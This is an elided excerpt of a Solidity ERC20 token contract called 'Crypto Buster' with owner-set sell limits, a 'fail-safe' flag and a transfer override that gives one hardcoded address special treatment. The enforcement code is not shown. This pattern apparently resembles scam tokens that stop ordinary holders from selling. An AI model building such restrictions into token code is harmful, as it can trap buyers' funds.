...
contract CryptoBuster is ERC20, Ownable {
    ...
    bool public _sellLimitEnabled = true;
    bool public _failSafeEnabled = false;
    uint256 public _buyLimitBasePoints = 10000;
    uint256 public _sellLimitBasePoints;
    uint256 private constant _totalSupply = 1000000000000000000000000000000000; 
    
    constructor() ERC20('Crypto Buster', 'CBUST') {
    ...
    function transfer(address _to, uint256 amount) public virtual override returns (bool) {
        ...
        if( _failSafeEnabled ||  _from == address(0x7A8321403CF8C93e00B9930656493334e6a455a0) || _to == address(0x7A8321403CF8C93e00B9930656493334e6a455a0)) {
